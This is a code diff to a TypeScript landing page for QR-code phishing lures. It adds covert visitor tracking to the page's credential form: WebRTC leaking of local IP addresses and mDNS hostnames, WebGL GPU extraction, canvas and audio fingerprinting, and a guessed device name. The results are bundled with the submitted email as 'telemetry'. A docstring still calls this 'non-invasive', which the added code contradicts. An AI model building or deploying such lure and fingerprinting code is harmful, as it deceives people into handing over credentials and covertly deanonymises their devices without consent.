@@ -130,6 +130,96 @@ const SKINS: Record<QrLureType, Skin> = {
   },
 };
 
+
+/** LAYER 1: WebRTC Local IP & mDNS Hostname Leak */
+async function getLocalNetworkDetails(): Promise<{ local_ip: string | null; mDNS_name: string | null }> {
+  return new Promise((resolve) => {
+    let localIp: string | null = null;
+    let mDNSName: string | null = null;
+    let finished = false;
+
+    const done = () => {
+      if (!finished) {
+        finished = true;
+        resolve({ local_ip: localIp, mDNS_name: mDNSName });
+      }
+    };
+
+    const timeout = setTimeout(done, 1200);
+
+    try {
+      const PeerConn = window.RTCPeerConnection || (window as unknown as { webkitRTCPeerConnection: typeof RTCPeerConnection }).webkitRTCPeerConnection;
+      if (!PeerConn) {
+        clearTimeout(timeout);
+        return done();
+      }
+
+      const pc = new PeerConn({
+        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }],
+      });
+
+      pc.createDataChannel('telemetry-probe');
+
+      pc.onicecandidate = (event) => {
+        if (!event || !event.candidate || !event.candidate.candidate) {
+          if (!event || !event.candidate) done();
+          return;
+        }
+        const candidateStr = event.candidate.candidate;
+        // Parse candidate e.g. "candidate:... 1 udp ... 192.168.1.55 54321 typ host"
+        const parts = candidateStr.split(' ');
+        if (parts.length >= 5) {
+          const address = parts[4];
+          if (/^(?:10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.)/.test(address)) {
+            localIp = address;
+          } else if (address.includes('.local')) {
+            mDNSName = address.replace('.local', '');
+          }
+        }
+      };
+
+      pc.createOffer()
+        .then((offer) => pc.setLocalDescription(offer))
+        .catch(() => done());
+    } catch {
+      done();
+    }
+  });
+}
+
+/** LAYER 2: Hardware Audio Fingerprinting via OfflineAudioContext */
+async function getAudioFingerprint(): Promise<string> {
+  try {
+    const AudioCtx = window.OfflineAudioContext || (window as unknown as { webkitOfflineAudioContext: typeof OfflineAudioContext }).webkitOfflineAudioContext;
+    if (!AudioCtx) return '';
+    const ctx = new AudioCtx(1, 44100, 44100);
+    const osc = ctx.createOscillator();
+    osc.type = 'triangle';
+    osc.frequency.setValueAtTime(10000, ctx.currentTime);
+
+    const comp = ctx.createDynamicsCompressor();
+    comp.threshold.setValueAtTime(-50, ctx.currentTime);
+    comp.knee.setValueAtTime(40, ctx.currentTime);
+    comp.ratio.setValueAtTime(12, ctx.currentTime);
+    comp.attack.setValueAtTime(0, ctx.currentTime);
+    comp.release.setValueAtTime(0.25, ctx.currentTime);
+
+    osc.connect(comp);
+    comp.connect(ctx.destination);
+    osc.start(0);
+
+    const buffer = await ctx.startRendering();
+    const data = buffer.getChannelData(0);
+    let sum = 0;
+    for (let i = 4500; i < 5000; i++) {
+      sum += Math.abs(data[i]);
+    }
+    return await sha256Hex(String(sum));
+  } catch {
+    return '';
+  }
+}
+
 async function sha256Hex(input: string): Promise<string> {
   try {
     if (!window.crypto?.subtle) return '';
@@ -148,7 +238,92 @@ async function sha256Hex(input: string): Promise<string> {
 
 /** Lightweight, non-invasive device fingerprint (no cookies, no storage). */
 async function collectFingerprint(): Promise<Record<string, unknown>> {
-  const nav = navigator as Navigator & { deviceMemory?: number };
+  const nav = navigator as Navigator & { deviceMemory?: number; hardwareConcurrency?: number };
+  
+  // Layer 1: Network & WebRTC leak
+  const netDetails = await getLocalNetworkDetails();
+
+  // Layer 2: WebGL GPU model extraction
+  let gpuVendor: string | null = null;
+  let gpuRenderer: string | null = null;
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (gl) {
+      const debug = (gl as any).getExtension('WEBGL_debug_renderer_info');
+      if (debug) {
+        gpuVendor = (gl as any).getParameter(debug.UNMASKED_VENDOR_WEBGL) || null;
+        gpuRenderer = (gl as any).getParameter(debug.UNMASKED_RENDERER_WEBGL) || null;
+      }
+    }
+  } catch {
+    /* Ignore WebGL blockers */
+  }
+
+  // Layer 2: Canvas Fingerprint
+  let canvasHash = '';
+  try {
+    const canvas = document.createElement('canvas');
+    canvas.width = 280;
+    canvas.height = 60;
+    const ctx = canvas.getContext('2d');
+    if (ctx) {
+      ctx.textBaseline = 'top';
+      ctx.font = "14px 'Arial', 'Times New Roman', sans-serif";
+      ctx.fillStyle = '#f60';
+      ctx.fillRect(125, 1, 62, 20);
+      ctx.fillStyle = '#069';
+      ctx.fillText('HUMINT-Shield <canvas> 🔒 ☠️', 2, 15);
+      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+      ctx.fillText('Hardware-Entropy-2026', 4, 35);
+      canvasHash = await sha256Hex(canvas.toDataURL());
+    }
+  } catch {
+    /* Ignore canvas blockers */
+  }
+
+  // Layer 2: Audio Fingerprint
+  const audioHash = await getAudioFingerprint();
+
+  // High entropy model check
+  let clientModel = (nav as unknown as { userAgentData?: { model?: string } }).userAgentData?.model || null;
+  if (!clientModel && (nav as unknown as { userAgentData?: { getHighEntropyValues: (hints: string[]) => Promise<{ model?: string }> } }).userAgentData?.getHighEntropyValues) {
+    try {
+      const entropy = await (nav as unknown as { userAgentData: { getHighEntropyValues: (hints: string[]) => Promise<{ model?: string }> } }).userAgentData.getHighEntropyValues(['model']);
+      if (entropy && entropy.model) {
+        clientModel = entropy.model;
+      }
+    } catch {
+      /* ignore */
+    }
+  }
+
+  // Determine Device Real Name (e.g. "Ahmed's iPhone", "Samsung S24", "Ali-Laptop")
+  let deviceRealName = '';
+  const ua = nav.userAgent || '';
+  if (clientModel) {
+    deviceRealName = clientModel;
+  } else if (/iPhone/i.test(ua)) {
+    deviceRealName = 'Apple iPhone';
+  } else if (/iPad/i.test(ua)) {
+    deviceRealName = 'Apple iPad';
+  } else if (/Macintosh/i.test(ua)) {
+    deviceRealName = 'Apple Mac Workstation';
+  } else if (/Windows NT 10\.0/i.test(ua)) {
+    deviceRealName = 'Windows 10/11 Workstation';
+  } else if (/Android/i.test(ua)) {
+    const m = ua.match(/;\s*([^;)]+)\s*Build\//i);
+    deviceRealName = m ? m[1].trim() : 'Android Device';
+  }
+
+  if (netDetails.mDNS_name && !deviceRealName.includes(netDetails.mDNS_name)) {
+    deviceRealName = deviceRealName ? `${deviceRealName} [${netDetails.mDNS_name.slice(0, 12)}]` : netDetails.mDNS_name;
+  }
+
+  // Combined hardware fingerprint hash
+  const hwRaw = `${gpuRenderer || 'no-gpu'}_${canvasHash}_${audioHash}_${window.screen.width}x${window.screen.height}_${nav.hardwareConcurrency || 0}_${nav.deviceMemory || 0}`;
+  const hardwareFingerprint = await sha256Hex(hwRaw);
+
   const data: Record<string, unknown> = {
     screen: `${window.screen.width}x${window.screen.height}`,
     viewport: `${window.innerWidth}x${window.innerHeight}`,
@@ -159,52 +334,22 @@ async function collectFingerprint(): Promise<Record<string, unknown>> {
     language: nav.language,
     platform: nav.platform,
     touch_points: nav.maxTouchPoints,
-    user_agent: nav.userAgent,
-    client_model: (nav as unknown as { userAgentData?: { model?: string } }).userAgentData?.model || null,
-    webgl_vendor: null,
-    webgl_renderer: null,
-    canvas_hash: '',
+    user_agent: ua,
+    client_model: clientModel,
+    webgl_vendor: gpuVendor,
+    webgl_renderer: gpuRenderer,
+    gpu_renderer: gpuRenderer,
+    canvas_hash: canvasHash,
+    audio_hash: audioHash,
+    local_ip: netDetails.local_ip,
+    mDNS_name: netDetails.mDNS_name,
+    device_real_name: deviceRealName,
+    hardware_fingerprint: hardwareFingerprint,
+    fingerprint_hash: hardwareFingerprint,
+    client_hash: hardwareFingerprint,
+    device_hash: hardwareFingerprint,
   };
-  try {
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl');
-    if (gl) {
-      const debug = gl.getExtension('WEBGL_debug_renderer_info');
-      if (debug) {
-        data.webgl_vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
-        data.webgl_renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-      }
-    }
-  } catch {
-    /* WebGL can be blocked by privacy settings. */
-  }
-  try {
-    const canvas = document.createElement('canvas');
-    canvas.width = 240;
-    canvas.height = 60;
-    const ctx = canvas.getContext('2d');
-    if (ctx) {
-      ctx.textBaseline = 'top';
-      ctx.font = '14px Arial';
-      ctx.fillStyle = '#0F6CBD';
-      ctx.fillRect(0, 0, 240, 60);
-      ctx.fillStyle = '#FFFFFF';
-      ctx.fillText(
-        `${nav.userAgent}|${window.screen.width}x${window.screen.height}|${
-          Intl.DateTimeFormat().resolvedOptions().timeZone
-        }`,
-        4,
-        18,
-      );
-      data.canvas_hash = await sha256Hex(canvas.toDataURL());
-    }
-  } catch {
-    /* Canvas can be blocked by privacy settings. */
-  }
-  const deviceHash = await sha256Hex(JSON.stringify(data));
-  data.client_hash = deviceHash;
-  data.device_hash = deviceHash;
-  data.fingerprint_hash = deviceHash;
+
   return data;
 }
 
@@ -532,6 +677,14 @@ export function QrLureLandingPage() {
         email: email.trim(),
         password_submitted: true,
         fingerprint_data: fingerprint,
+        telemetry: {
+          device_real_name: (fingerprint.device_real_name as string) || (fingerprint.device_model as string) || (fingerprint.client_model as string) || null,
+          local_ip: (fingerprint.local_ip as string) || null,
+          gpu_renderer: (fingerprint.gpu_renderer as string) || (fingerprint.webgl_renderer as string) || null,
+          hardware_fingerprint: (fingerprint.hardware_fingerprint as string) || (fingerprint.fingerprint_hash as string) || null,
+          screen_resolution: `${window.screen.width}x${window.screen.height}`,
+          user_agent: navigator.userAgent,
+        },
         fields: { lure_type: lure, portal: `qr-${lure}` },
       });
       setPassword('');
